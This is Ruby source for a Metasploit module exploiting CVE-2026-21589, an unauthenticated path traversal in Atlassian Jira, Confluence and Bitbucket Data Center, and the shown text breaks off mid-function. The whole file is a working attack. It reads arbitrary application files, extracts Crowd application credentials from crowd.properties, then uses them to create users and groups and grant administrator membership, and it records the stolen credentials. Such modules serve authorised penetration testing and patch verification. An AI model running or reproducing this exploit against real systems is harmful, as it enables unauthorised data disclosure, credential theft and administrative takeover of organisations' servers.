##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  ATLASSIAN_PRODUCTS = [
    {
      name: 'Jira',
      resource_path: 'download/resources/jira.webresources:color-picker-popup/images',
      traversal_depth: 5,
      check_file: 'WEB-INF/web.xml',
      check_marker: 'com.atlassian.jira.web.ServletContextProviderListener',
      fixed_versions: %w[5.12.40 9.12.40 10.3.26 11.3.12],
      admin_groups: %w[jira-system-administrators jira-administrators],
      default_admin_group: 'jira-administrators',
      supports_privilege_actions: true
    },
    {
      name: 'Confluence',
      resource_path: 's/1/_/download/resources/com.atlassian.confluence.plugins.dashboard-actions/images',
      traversal_depth: 8,
      check_file: 'WEB-INF/web.xml',
      check_marker: 'com.atlassian.confluence.impl.webapp.ServletsInitializer',
      fixed_versions: %w[9.2.26 10.2.19],
      admin_groups: %w[confluence-administrators],
      default_admin_group: 'confluence-administrators',
      supports_privilege_actions: true
    },
    {
      name: 'Bitbucket',
      resource_path: 's/1.0/_/download/resources/com.atlassian.bitbucket.server.bitbucket-webpack-INTERNAL:avatar/avatar',
      traversal_depth: 5,
      check_file: 'WEB-INF/urlrewrite.xml',
      check_marker: 'com.atlassian.plugin.servlet.ResourceDownloadUtils',
      fixed_versions: %w[9.4.26 10.2.8 10.5.1],
      admin_groups: [],
      supports_privilege_actions: false
    }
  ].freeze
  CROWD_PROPERTIES_FILE = 'WEB-INF/classes/crowd.properties'.freeze
  CROWD_PROPERTY_KEYS = %w[application.name application.password crowd.base.url crowd.server.url].freeze
  CROWD_WRITE_REJECTION_CODES = [400, 401, 403, 404, 409].freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Atlassian::ProductFingerprint
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Atlassian Data Center CVE-2026-21589 Arbitrary File Read and Crowd Privilege Escalation',
        'Description' => %q{
          This module exploits an unauthenticated path traversal in the web resource
          component used by Jira, Confluence, and Bitbucket Data Center. The check
          safely reads a protected application file to confirm CVE-2026-21589.

          Jira Software fixes are 9.12.40, 10.3.26, and 11.3.12. Jira Service
          Management fixes are 5.12.40, 10.3.26, and 11.3.12. Confluence fixes
          are 9.2.26 and 10.2.19. Bitbucket fixes are 9.4.26, 10.2.8, and 10.5.1.

          The default action reads an operator-selected file within the application
          root. Jira and Confluence can also use disclosed Crowd settings to create
          or select a user and add target access and administrator memberships.
          Crowd must be reachable from Metasploit. The Crowd application must allow
          user creation, membership changes, and optional group creation.
        },
        'Author' => [
          'Piotr Bazydlo (@chudyPB)', # Vulnerability research and PoC
          'Sonny',                    # Vulnerability research and PoC
          'Yordan Ganchev',           # Vulnerability research and PoC
          'Christophe De La Fuente'   # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-21589'],
          ['URL', 'https://confluence.atlassian.com/security/cve-2026-21589-arbitrary-file-access-vulnerability-impacts-multiple-products-1870495748.html'],
          ['URL', 'https://labs.watchtowr.com/you-wont-hear-about-these-even-in-myths-atlassian-jira-confluence-and-more-pre-auth-arbitrary-file-read-cve-2026-21589/'],
          ['URL', 'https://github.com/watchtowrlabs/watchTowr-vs-Atlassian-CVE-2026-21589']
        ],
        'DisclosureDate' => '2026-10-05',
        'Actions' => [
          ['READ_FILE', { 'Description' => 'Read a file from the Atlassian application root' }],
          ['CREATE_USER', { 'Description' => 'Create a new Crowd user and grant target administrator membership' }],
          ['MODIFY_PRIVILEGES', { 'Description' => 'Grant an existing Crowd user target administrator membership' }]
        ],
        'DefaultAction' => 'READ_FILE',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The Atlassian application base path', '/']),
        OptString.new('FILE_PATH', [false, 'A path relative to the Atlassian application root'], conditions: %w[ACTION == READ_FILE]),
        OptString.new('CROWD_URL', [false, 'A reachable Crowd base URL that approves or overrides crowd.properties'], conditions: ['ACTION', 'in', %w[CREATE_USER MODIFY_PRIVILEGES]]),
        OptString.new('USERNAME', [false, 'The Crowd username to create or promote'], conditions: ['ACTION', 'in', %w[CREATE_USER MODIFY_PRIVILEGES]]),
        OptString.new('PASSWORD', [false, 'The password for a created Crowd user', Faker::Internet.password(min_length: 16)], conditions: %w[ACTION == CREATE_USER]),
        OptString.new('ADMIN_GROUP', [false, 'A Crowd group that has target administrator permission'], conditions: ['ACTION', 'in', %w[CREATE_USER MODIFY_PRIVILEGES]]),
        OptString.new('ACCESS_GROUP', [false, 'An existing Crowd group that permits target application access'], conditions: ['ACTION', 'in', %w[CREATE_USER MODIFY_PRIVILEGES]]),
        OptBool.new('CREATE_MISSING_ADMIN_GROUP', [true, 'Create the selected administrator group when it does not exist', true], conditions: ['ACTION', 'in', %w[CREATE_USER MODIFY_PRIVILEGES]])
      ]
    )
  end

  def check
    reset_target_state_if_needed
    discovery = discover_atlassian_product
    @product = discovery[:product]
    @application_service = report_atlassian_service(@product, discovery[:version]) if @product

    case discovery[:status]
    when :vulnerable
      return Exploit::CheckCode::Vulnerable(
        action_compatibility_reason(@product, discovery[:version]),
        vuln: { service: @application_service }
      )
    when :detected
      passive_check_result(@product, discovery[:version])
    when :unreachable
      Exploit::CheckCode::Unknown('No supported traversal route received a response')
    else
      Exploit::CheckCode::Safe('No supported traversal route disclosed a protected Atlassian application file')
    end
  end

  def run
    reset_target_state_if_needed
    @crowd_service = nil
    @created_user = nil
    @created_groups = []
    @memberships_added = []
    @crowd_cleanup = nil
    @crowd_action_complete = false
    return read_target_file if action.name == 'READ_FILE'

    ensure_privilege_action_supported(@product) if @product
    configuration = retrieve_crowd_configuration
    report_disclosed_crowd_credential(configuration)
    crowd_uri = parse_crowd_uri(configuration[:crowd_url])
    configuration[:rhost] = validate_crowd_origin!(crowd_uri)
    username = action.name == 'CREATE_USER' ? new_username(crowd_uri, configuration) : existing_username(crowd_uri, configuration)
    @crowd_cleanup = { uri: crowd_uri, configuration: configuration, username: username }
    admin_group, membership_groups = select_privilege_groups(crowd_uri, configuration)
    report_crowd_access(crowd_uri, configuration)
    create_crowd_user(crowd_uri, configuration, username) if action.name == 'CREATE_USER'

    membership_groups.each { |group_name| add_user_to_group(crowd_uri, configuration, username, group_name) }
    @crowd_action_complete = true
    report_created_admin(crowd_uri, configuration, username, admin_group) if action.name == 'CREATE_USER'

    print_good("Crowd user '#{username}' is a direct member of #{membership_groups.map { |group_name| "'#{group_name}'" }.join(' and ')}")
    print_status('The target application may require a Crowd directory synchronization before the membership becomes active')
  end

  def cleanup
    cleanup_partial_crowd_changes if @crowd_cleanup && !@crowd_action_complete
  ensure
    super
  end

  def report_vuln(opts = {})
    service = opts[:service] || @application_service
    return super(opts) unless service

    super(opts.merge(service: service))
  end

  private

  # Clear cached target state if the request identity or reporting workspace
  # changes between `check` and `run`.
  def reset_target_state_if_needed
    # Keep a persisted service reported by check, but discard the unsaved copy
    # made by module replication so later reports resolve the database row.
    @application_service = nil if @application_service && !@application_service.persisted?
    current_identity = [rhost, rport, ssl, vhost, target_uri.path, workspace]
    return if @target_identity == current_identity

    @target_identity = current_identity
    @product = nil
    @application_service = nil
  end

  def read_application_file(product, file_path)
    send_request_cgi(
      'method' => 'GET',
      'uri' => traversal_uri(product, file_path)
    )
  end

  def discover_atlassian_product
    traversal_responded = false

    ATLASSIAN_PRODUCTS.each do |product|
      res = read_application_file(product, product[:check_file])
      traversal_responded ||= !res.nil?
      next unless res&.code == 200 && res.body.to_s.include?(product[:check_marker])

      fingerprint = product_fingerprint_for_check(product)
      return { status: :vulnerable, product: product, response: res, version: fingerprint[:version] }
    end

    fingerprint = ATLASSIAN_PRODUCTS.lazy.map { |product| [product, product_fingerprint_for_check(product)] }.find { |_, result| result[:detected] }
    if fingerprint
      product, fingerprint_result = fingerprint
      return { status: :detected, product: product, response: fingerprint_result[:response], version: fingerprint_result[:version] }
    end

    { status: traversal_responded ? :not_detected : :unreachable, product: nil, response: nil, version: nil }
  end

  def traversal_uri(product, file_path)
    escaped_path = ((['..'] * product[:traversal_depth]) + file_path.split('/')).join('::')
    normalize_uri(target_uri.path, product[:resource_path], escaped_path)
  end

  def product_fingerprint_for_check(product)
    fingerprint_atlassian_product(product[:name])
  rescue Msf::Exploit::Remote::HTTP::Atlassian::ProductFingerprint::InvalidVersionError => e
    elog("Atlassian #{product[:name]} advertised an invalid version", error: e)
    {
      detected: true,
      product: product[:name].downcase.to_sym,
      response: nil,
      version: nil
    }
  end

  # Atlassian only patched the listed active branches, so intermediate
  # historical branches remain affected even when their version is greater
  # than a patched LTS branch. A newer unlisted branch supplies product
  # evidence, but it does not support a vulnerability claim.
  def product_version_state(product, version)
    version_branch = version.to_s.split('.')[0, 2]
    fixed_release = product[:fixed_versions].find { |candidate| candidate.split('.')[0, 2] == version_branch }
    return version < Rex::Version.new(fixed_release) ? :vulnerable : :fixed if fixed_release

    latest_fixed_release = product[:fixed_versions].map { |candidate| Rex::Version.new(candidate) }.max
    version < latest_fixed_release ? :vulnerable : :unknown
  end

  def passive_check_result(product, product_version)
    product_identity = "Atlassian #{product[:name]}"
    action_support = passive_action_compatibility(product)
    unless product_version
      return Exploit::CheckCode::Detected("#{product_identity} was detected, but its version could not be determined; #{action_support}")
    end

    product_identity = "#{product_identity} #{product_version}"
    case product_version_state(product, product_version)
    when :vulnerable
      Exploit::CheckCode::Appears("#{product_identity} is within the affected release range; #{action_support}")
    when :fixed
      Exploit::CheckCode::Safe("#{product_identity} is on a fixed release branch; #{action_support}")
    else
      Exploit::CheckCode::Detected("#{product_identity} was detected, but this release branch is not mapped to a known fix; #{action_support}")
    end
  end

  def passive_action_compatibility(product)
    return 'READ_FILE supports this product' if action.name == 'READ_FILE'

    unless product[:supports_privilege_actions]
      return "#{action.name} does not support #{product[:name]}; use READ_FILE"
    end

    "#{action.name} supports #{product[:name]}, but the traversal did not expose usable Crowd settings"
  end

  def action_compatibility_reason(product, version = nil)
    product_identity = "Atlassian #{product[:name]}"
    product_identity = "#{product_identity} #{version}" if version
    evidence = "#{product_identity} disclosed #{product[:check_file]}"
    return "#{evidence}; READ_FILE is supported within the application root" if action.name == 'READ_FILE'

    unless product[:supports_privilege_actions]
      return "#{evidence}; READ_FILE is supported, but #{action.name} is not supported for #{product[:name]}"
    end

    crowd_res = read_application_file(product, CROWD_PROPERTIES_FILE)
    configuration = crowd_configuration_from_content(crowd_res.body.to_s) if crowd_res&.code == 200
    if configuration
      "#{evidence}; #{action.name} found usable Crowd integration settings, but Crowd reachability and write permissions remain unverified"
    else
      "#{evidence}; #{action.name} requires usable #{CROWD_PROPERTIES_FILE} settings that were not disclosed"
    end
  end

  def read_target_file
    discovery = discover_atlassian_product unless @product
    if discovery
      @product = discovery[:product]
      unless @product
        if discovery[:status] == :unreachable
          fail_with(Failure::Unreachable, 'No supported traversal route received a response while identifying the Atlassian product')
        end

        fail_with(Failure::NotFound, 'The target did not identify as a supported Atlassian product')
      end
      @application_service ||= report_atlassian_service(@product, discovery[:version])
    end

    file_path = configured_file(@product)
    res = if discovery&.dig(:status) == :vulnerable && file_path == @product[:check_file]
            discovery[:response]
          else
            read_application_file(@product, file_path)
          end
    fail_with(Failure::Unreachable, "The target did not respond while reading #{file_path}") unless res

    if res.code == 200
      @application_service ||= report_atlassian_service(@product)
      report_vuln(
        host: rhost,
        port: rport,
        proto: 'tcp',
        name: fullname,
        refs: references,
        info: "Unauthenticated traversal disclosed #{file_path}"
      )

      loot_path = store_loot(
        "atlassian.#{@product[:name].downcase}.file",
        res.headers['Content-Type'].presence || 'application/octet-stream',
        rhost,
        res.body.to_s,
        file_path.split('/').last,
        "Atlassian #{@product[:name]} application file: #{file_path}",
        @application_service
      )
      print_good("Atlassian #{@product[:name]} disclosed '#{file_path}'; file saved to #{loot_path}")
      return loot_path
    end

    fail_with(Failure::NoAccess, "Atlassian #{@product[:name]} denied access to '#{file_path}'") if [401, 403].include?(res.code)
    fail_with(Failure::UnexpectedReply, "Atlassian #{@product[:name]} returned HTTP #{res.code} while reading '#{file_path}'; expected HTTP 200")
  end

  def configured_file(product)
    file_path = datastore['FILE_PATH'].presence || product[:check_file]
    fail_with(Failure::BadConfig, 'FILE_PATH cannot contain control characters') if file_path.match?(/[\u0000-\u001f\u007f]/)

    file_path
  end

  def ensure_privilege_action_supported(product)
    return if product[:supports_privilege_actions]

    fail_with(Failure::NoTarget, "#{action.name} is not supported for Atlassian #{product[:name]}; use READ_FILE")
  end

  def retrieve_crowd_configuration
    target_responded = false
    products = if @product
                 [@product]
               else
                 ATLASSIAN_PRODUCTS.select { |product| product[:supports_privilege_actions] }
               end

    products.each do |product|
      res = read_application_file(product, CROWD_PROPERTIES_FILE)
      next unless res

      target_responded = true
      next unless res.code == 200

      configuration = crowd_configuration_from_content(res.body.to_s)
      next unless configuration

      @product = product
      @application_service ||= report_atlassian_service(product)
      report_vuln(
        host: rhost,
        port: rport,
        proto: 'tcp',
        name: fullname,
        refs: references,
        info: "Unauthenticated traversal disclosed #{CROWD_PROPERTIES_FILE}"
      )

      configuration[:user_password] = action.name == 'CREATE_USER' ? datastore['PASSWORD'] : nil
      return configuration
    end

    unless target_responded
      fail_with(Failure::Unreachable, "The target did not respond while reading #{CROWD_PROPERTIES_FILE}")
    end

    fail_with(Failure::NotFound, 'The traversal did not return usable Crowd integration settings; set CROWD_URL if only the stored Crowd URL is unsuitable')
  end

  def crowd_configuration_from_content(content)
    properties = parse_crowd_properties(content)
    return if properties['application.name'].blank? || properties['application.password'].blank?

    crowd_url = datastore['CROWD_URL'].presence || properties['crowd.base.url']
    if crowd_url.blank? && properties['crowd.server.url']&.match?(%r{/services/?\z})
      crowd_url = properties['crowd.server.url'].sub(%r{/services/?\z}, '/')
    end
    return if crowd_url.blank?

    {
      application_name: properties['application.name'],
      application_password: properties['application.password'],
      crowd_url: crowd_url
    }
  end

  def parse_crowd_properties(content)
    content.each_line.each_with_object({}) do |line, properties|
      line = line.strip
      next if line.empty? || line.start_with?('#', '!')

      key, value = line.split(/[=:\s]+/, 2)
      properties[key] = value if CROWD_PROPERTY_KEYS.include?(key) && value
    end
  rescue ArgumentError => e
    elog('Failed to parse Crowd properties', error: e)
    {}
  end

  def parse_crowd_uri(raw_url)
    begin
      uri = URI.parse(raw_url)
    rescue URI::InvalidURIError
      fail_with(Failure::BadConfig, 'The Crowd base URL is invalid; set CROWD_URL to a reachable HTTP or HTTPS URL')
    end

    unless %w[http https].include?(uri.scheme&.downcase) && uri.hostname.present? && uri.userinfo.blank? && uri.query.blank? && uri.fragment.blank?
      fail_with(Failure::BadConfig, 'The Crowd base URL must use HTTP or HTTPS without user information, a query, or a fragment')
    end

    print_status("Using Crowd endpoint #{uri.scheme}://#{Rex::Socket.to_authority(uri.hostname, uri.port)}#{normalize_uri(uri.path)}")
    uri
  end

  # crowd.properties is target-controlled. An automatically approved URL may
  # set the virtual host, but it must not replace the original network target.
  def validate_crowd_origin!(crowd_uri)
    target_scheme = ssl ? 'https' : 'http'
    target_host = vhost.delete_prefix('[').delete_suffix(']')
    same_origin = crowd_uri.scheme.casecmp(target_scheme).zero? && crowd_uri.hostname.casecmp(target_host).zero? && crowd_uri.port == rport
    if datastore['CROWD_URL'].blank?
      fail_with(Failure::BadConfig, 'The leaked Crowd URL has a different origin; set CROWD_URL to approve the Crowd endpoint') unless same_origin

      return rhost
    end

    # HttpRawHeaders applies to every HttpClient request and may contain
    # Atlassian-only credentials that must not reach another endpoint.
    target_connection_host = rhost.delete_prefix('[').delete_suffix(']')
    same_connection_host = crowd_uri.hostname.casecmp(target_connection_host).zero?
    if datastore['HttpRawHeaders'].present? && (!same_origin || !same_connection_host)
      fail_with(Failure::BadConfig, 'Unset HttpRawHeaders before using a Crowd endpoint that differs from the Atlassian target')
    end

    crowd_uri.hostname
  end

  def select_privilege_groups(crowd_uri, configuration)
    # Check each Crowd group once during selection and reuse both existing and missing results.
    checked_groups = {}
    group_exists = lambda do |group_name|
      checked_groups.fetch(group_name) do
        checked_groups[group_name] = crowd_group_exists?(crowd_uri, configuration, group_name)
      end
    end

    admin_group = datastore['ADMIN_GROUP'].presence || @product[:admin_groups].find do |group_name|
      group_exists.call(group_name)
    end
    admin_group ||= @product[:default_admin_group]

    if admin_group.blank?
      fail_with(Failure::BadConfig, "ADMIN_GROUP is required for #{@product[:name]} because Crowd cannot identify the product's global permissions")
    end

    # Some deployments require a separate group for application access. That
    # group must already be permissioned because creating it grants no access.
    access_group = datastore['ACCESS_GROUP'].presence
    if access_group && !group_exists.call(access_group)
      fail_with(Failure::NotFound, "ACCESS_GROUP '#{access_group}' does not exist in Crowd; specify a group already authorized for the target application")
    end

    unless admin_group == access_group || group_exists.call(admin_group)
      create_crowd_group(crowd_uri, configuration, admin_group)
    end
    membership_groups = [access_group, admin_group].compact.uniq

    [admin_group, membership_groups]
  end

  def create_crowd_group(crowd_uri, configuration, group_name)
    unless datastore['CREATE_MISSING_ADMIN_GROUP']
      fail_with(Failure::NotFound, partial_membership_failure("Crowd group '#{group_name}' does not exist; create it or set CREATE_MISSING_ADMIN_GROUP true"))
    end

    print_status("Creating Crowd group '#{group_name}'")
    @created_groups << group_name
    res = crowd_request(
      crowd_uri,
      configuration,
      method: 'POST',
      endpoint: %w[rest usermanagement 1 group],
      data: {
        'name' => group_name,
        'type' => 'GROUP',
        'active' => true
      }.to_json
    )
    # A documented rejection means this run did not create the group. Retain
    # tracking for missing responses and server errors because creation may have completed.
    @created_groups.delete(group_name) if crowd_write_rejected?(res)
    fail_crowd_request(res, "Crowd group '#{group_name}' creation", accepted_codes: [201])

    unless crowd_group_exists?(crowd_uri, configuration, group_name)
      fail_with(Failure::UnexpectedReply, partial_membership_failure("Crowd returned HTTP 201, but created group '#{group_name}' could not be verified"))
    end

    print_status("Created Crowd group '#{group_name}'")
  end

  def crowd_group_exists?(crowd_uri, configuration, group_name)
    res = crowd_request(
      crowd_uri,
      configuration,
      method: 'GET',
      endpoint: %w[rest usermanagement 1 group],
      vars_get: { 'groupname' => group_name }
    )
    fail_with(Failure::Unreachable, partial_membership_failure("Crowd did not respond while checking group '#{group_name}'")) unless res

    case res.code
    when 200
      document = res.get_json_document
      unless document.is_a?(Hash) && document['name'] == group_name
        fail_with(Failure::UnexpectedReply, partial_membership_failure('Crowd returned an unexpected group document'))
      end
      true
    when 404
      false
    when 401
      fail_with(Failure::NoAccess, partial_membership_failure('Crowd did not accept the application credentials during group lookup'))
    when 403
      fail_with(Failure::NoAccess, partial_membership_failure('Crowd group lookup was forbidden; verify the application is active, permits this source address, and allows the operation'))
    else
      fail_with(Failure::UnexpectedReply, partial_membership_failure("Crowd returned HTTP #{res.code} while checking group '#{group_name}'"))
    end
  end

  def new_username(crowd_uri, configuration)
    username = datastore['USERNAME'].presence || Faker::Internet.username(specifier: 8..12)
    fail_with(Failure::BadConfig, 'PASSWORD cannot be empty') if configuration[:user_password].blank?

    fail_with(Failure::BadConfig, "Crowd user '#{username}' already exists; set USERNAME to a different value") if crowd_user_exists?(crowd_uri, configuration, username)

    username
  end

  def create_crowd_user(crowd_uri, configuration, username)
    first_name = Faker::Name.first_name
    last_name = Faker::Name.last_name
    print_status("Creating Crowd user '#{username}'")
    @created_user = username
    res = crowd_request(
      crowd_uri,
      configuration,
      method: 'POST',
      endpoint: %w[rest usermanagement 1 user],
      data: {
        'name' => username,
        'active' => true,
        'first-name' => first_name,
        'last-name' => last_name,
        'display-name' => "#{first_name} #{last_name}",
        'email' => Faker::Internet.email(name: username),
        'password' => { 'value' => configuration[:user_password] }
      }.to_json
    )

    # A documented rejection means this run did not create the user. Retain
    # tracking for missing responses and server errors because creation may have completed.
    @created_user = nil if crowd_write_rejected?(res)
    fail_crowd_request(res, 'Crowd user creation', accepted_codes: [201])
    unless crowd_user_exists?(crowd_uri, configuration, username)
      fail_with(Failure::UnexpectedReply, partial_membership_failure("Crowd returned HTTP 201, but created user '#{username}' could not be verified"))
    end

    print_good("Created Crowd user '#{username}'; its password is stored in PASSWORD")
    username
  end

  def existing_username(crowd_uri, configuration)
    username = datastore['USERNAME']
    fail_with(Failure::BadConfig, 'USERNAME cannot be empty') if username.blank?
    fail_with(Failure::NotFound, "Crowd user '#{username}' does not exist") unless crowd_user_exists?(crowd_uri, configuration, username)

    username
  end

  def crowd_user_exists?(crowd_uri, configuration, username)
    res = crowd_request(
      crowd_uri,
      configuration,
      method: 'GET',
      endpoint: %w[rest usermanagement 1 user],
      vars_get: { 'username' => username }
    )
    fail_with(Failure::Unreachable, partial_membership_failure('Crowd did not respond while checking the user')) unless res

    case res.code
    when 200
      document = res.get_json_document
      unless document.is_a?(Hash) && document['name'] == username
        fail_with(Failure::UnexpectedReply, partial_membership_failure('Crowd returned an unexpected user document'))
      end
      true
    when 404
      false
    when 401
      fail_with(Failure::NoAccess, partial_membership_failure('Crowd did not accept the disclosed application credentials'))
    when 403
      fail_with(Failure::NoAccess, partial_membership_failure('Crowd user lookup was forbidden; verify the application is active, permits this source address, and allows the operation'))
    else
      fail_with(Failure::UnexpectedReply, partial_membership_failure("Crowd returned HTTP #{res.code} while checking the user"))
    end
  end

  def add_user_to_group(crowd_uri, configuration, username, group_name)
    return if crowd_direct_membership_exists?(crowd_uri, configuration, username, group_name)

    print_status("Adding Crowd user '#{username}' to '#{group_name}'")
    @memberships_added << group_name
    res = crowd_request(
      crowd_uri,
      configuration,
      method: 'POST',
      endpoint: %w[rest usermanagement 1 group user direct],
      vars_get: { 'groupname' => group_name },
      data: { 'name' => username }.to_json
    )
    # A rejection confirms this run added nothing. Missing responses and server
    # errors remain tracked because the membership change may have completed.
    @memberships_added.delete(group_name) if crowd_write_rejected?(res)
    fail_crowd_request(res, 'Crowd group membership change', accepted_codes: [201, 409])

    unless crowd_direct_membership_exists?(crowd_uri, configuration, username, group_name)
      fail_with(Failure::UnexpectedReply, partial_membership_failure("Crowd did not confirm membership in '#{group_name}'"))
    end
  end

  def crowd_direct_membership_exists?(crowd_uri, configuration, username, group_name)
    res = crowd_request(
      crowd_uri,
      configuration,
      method: 'GET',
      endpoint: %w[rest usermanagement 1 user group direct],
      vars_get: { 'username' => username, 'groupname' => group_name }
    )
    fail_with(Failure::Unreachable, partial_membership_failure('Crowd did not respond while checking group membership')) unless res

    case res.code
    when 200
      document = res.get_json_document
      # A groupname filter returns one group, but some releases retain a
      # collection wrapper. Normalize both shapes before validation.
      if document.is_a?(Hash)
        groups = [document] if document.key?('name')
        groups ||= document['groups'] || document['group']
      end
      unless groups.is_a?(Array) && groups.all? { |group| group.is_a?(Hash) && group['name'].is_a?(String) }
        fail_with(Failure::UnexpectedReply, partial_membership_failure('Crowd returned an unexpected group membership document'))
      end

      groups.any? { |group| group['name'] == group_name }
    when 404
      false
    when 401
      fail_with(Failure::NoAccess, partial_membership_failure('Crowd did not accept the application credentials during group membership verification'))
    when 403
      fail_with(Failure::NoAccess, partial_membership_failure('Crowd group membership verification was forbidden; verify the application is active, permits this source address, and allows the operation'))
    else
      fail_with(Failure::UnexpectedReply, partial_membership_failure("Crowd returned HTTP #{res.code} while checking group membership"))
    end
  end

  def crowd_request(crowd_uri, configuration, method:, endpoint:, vars_get: nil, data: nil)
    opts = {
      'method' => method,
      'rhost' => configuration[:rhost],
      'rport' => crowd_uri.port,
      'SSL' => crowd_uri.scheme.casecmp('https').zero?,
      'vhost' => crowd_uri.hostname,
      'ssl_server_name_indication' => crowd_uri.hostname,
      'uri' => normalize_uri(crowd_uri.path, *endpoint),
      'headers' => {
        'Accept' => 'application/json',
        'Authorization' => basic_auth(configuration[:application_name], configuration[:application_password])
      },
      'cookie' => '',
      'preferred_auth' => 'None',
      'username' => configuration[:application_name],
      'password' => configuration[:application_password]
    }
    opts['ctype'] = 'application/json' if data
    opts['data'] = data if data
    opts['vars_get'] = vars_get if vars_get

    # Crowd can keep the HTTP/1.1 connection open after an empty 204 response.
    # Closing it prevents Rex from waiting for body framing that will not arrive.
    opts['connection'] = 'close' if method == 'DELETE'

    # Crowd rejects browser-like state changes unless Origin identifies Crowd.
    if method != 'GET'
      opts['headers']['Origin'] = "#{crowd_uri.scheme}://#{Rex::Socket.to_authority(crowd_uri.hostname, crowd_uri.port)}"
    end

    send_request_cgi(opts)
  end

  # These statuses confirm the write failed. Keep cleanup tracking on
  # timeouts and server errors since Crowd may have committed the change.
  def crowd_write_rejected?(res)
    res && CROWD_WRITE_REJECTION_CODES.include?(res.code)
  end

  def fail_crowd_request(res, operation, accepted_codes:)
    fail_with(Failure::Unreachable, partial_membership_failure("#{operation} received no response")) unless res
    return if accepted_codes.include?(res.code)

    case res.code
    when 401
      fail_with(Failure::NoAccess, partial_membership_failure("#{operation} did not accept the application credentials"))
    when 403
      fail_with(Failure::NoAccess, partial_membership_failure("#{operation} was forbidden; verify the application is active, permits this source address, and allows the operation"))
    when 404
      fail_with(Failure::NotFound, partial_membership_failure("#{operation} could not find the endpoint or group"))
    else
      fail_with(Failure::UnexpectedReply, partial_membership_failure("#{operation} returned HTTP #{res.code}"))
    end
  end

  def cleanup_partial_crowd_changes
    crowd_uri = @crowd_cleanup[:uri]
    configuration = @crowd_cleanup[:configuration]
    username = @crowd_cleanup[:username]

    @memberships_added.reverse_each do |group_name|
      cleanup_crowd_resource(crowd_uri, configuration, "membership in '#{group_name}'", %w[rest usermanagement 1 group user direct], groupname: group_name, username: username)
    end
    cleanup_crowd_resource(crowd_uri, configuration, "created user '#{@created_user}'", %w[rest usermanagement 1 user], username: @created_user) if @created_user
    @created_groups.reverse_each do |group_name|
      cleanup_crowd_resource(crowd_uri, configuration, "created group '#{group_name}'", %w[rest usermanagement 1 group], groupname: group_name)
    end
  end

  def cleanup_crowd_resource(crowd_uri, configuration, description, endpoint, vars_get)
    res = crowd_request(crowd_uri, configuration, method: 'DELETE', endpoint: endpoint, vars_get: vars_get)
    if res && [204, 404].include?(res.code)
      print_good("Removed #{description}")
      return
    end

    # A missing DELETE response can occur after Crowd committed the deletion.
    # Verify the exact resource is absent before warning about residual state.
    verification_res = crowd_request(crowd_uri, configuration, method: 'GET', endpoint: endpoint, vars_get: vars_get)
    if verification_res&.code == 404
      print_good("Removed #{description}")
      return
    end

    print_warning("Could not confirm removal of #{description}; cleanup DELETE received #{res ? "HTTP #{res.code}" : 'no response'} and verification GET received #{verification_res ? "HTTP #{verification_res.code}" : 'no response'}")
  end

  def partial_membership_failure(message)
    possible_changes = []
    possible_changes << "created user '#{@created_user}' may remain in Crowd" if @created_user
    possible_changes << "created Crowd groups #{@created_groups.map { |group_name| "'#{group_name}'" }.join(', ')} may remain" if @created_groups.present?
    possible_changes << "membership in #{@memberships_added.map { |group_name| "'#{group_name}'" }.join(', ')} may have been added" if @memberships_added.present?

    return message if possible_changes.empty?

    "#{message}; #{possible_changes.join('; ')}"
  end

  def report_atlassian_service(product, version = nil)
    service_info = "Atlassian #{product[:name]} Data Center"
    service_info = "#{service_info} #{version}" if version

    report_application_service(
      address: rhost,
      port: rport,
      ssl_enabled: ssl,
      service_name: "atlassian-#{product[:name].downcase}",
      service_info: service_info,
      resource_path: target_uri.path
    )
  end

  def report_crowd_access(crowd_uri, configuration)
    credential_data = disclosed_crowd_credential_data(configuration).merge(
      access_level: 'application',
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      last_attempted_at: Time.now
    )
    report_crowd_login(crowd_uri, configuration, credential_data)
  end

  def report_disclosed_crowd_credential(configuration)
    create_credential(disclosed_crowd_credential_data(configuration))
  end

  def disclosed_crowd_credential_data(configuration)
    # The vulnerable application disclosed the credential. Crowd is where the
    # module later verifies that credential, not its origin.
    credential_data = {
      workspace_id: myworkspace_id,
      origin_type: :service,
      module_fullname: fullname,
      username: configuration[:application_name],
      private_type: :password,
      private_data: configuration[:application_password],
      address: rhost,
      port: rport,
      protocol: 'tcp',
      service_name: @application_service&.name || "atlassian-#{@product[:name].downcase}"
    }
    credential_data[:service_id] = @application_service.id if @application_service
    credential_data
  end

  def report_created_admin(crowd_uri, configuration, username, admin_group)
    credential_data = {
      workspace_id: myworkspace_id,
      origin_type: :service,
      module_fullname: fullname,
      username: username,
      private_type: :password,
      private_data: configuration[:user_password],
      address: configuration[:rhost],
      port: crowd_uri.port,
      protocol: 'tcp',
      service_name: @crowd_service&.name || 'atlassian-crowd',
      access_level: admin_group,
      status: Metasploit::Model::Login::Status::UNTRIED
    }
    credential_data[:service_id] = @crowd_service.id if @crowd_service
    report_crowd_login(crowd_uri, configuration, credential_data)
  end

  def report_crowd_login(crowd_uri, configuration, credential_data)
    core = create_credential(credential_data)
    return unless core

    @crowd_service ||= report_application_service(
      address: configuration[:rhost],
      port: crowd_uri.port,
      ssl_enabled: crowd_uri.scheme.casecmp('https').zero?,
      service_name: 'atlassian-crowd',
      service_info: 'Atlassian Crowd',
      resource_path: crowd_uri.path
    )

    # Direct login creation keeps the credential's original service while
    # attaching its validation to the exact Crowd service.
    login_data = credential_data.merge(
      core: core,
      address: configuration[:rhost],
      port: crowd_uri.port,
      protocol: 'tcp',
      service_name: @crowd_service&.name || 'atlassian-crowd'
    )
    login_data.delete(:service_id)
    login_data[:service_id] = @crowd_service.id if @crowd_service
    create_credential_login(login_data)
  end

  def report_application_service(address:, port:, ssl_enabled:, service_name:, service_info:, resource_path:)
    common = { host: address, port: port, proto: 'tcp' }
    tcp_service = common.merge(name: 'tcp', parents: nil)
    web_service = if ssl_enabled
                    common.merge(name: 'https', parents: common.merge(name: 'ssl', parents: tcp_service))
                  else
                    common.merge(name: 'http', parents: tcp_service)
                  end

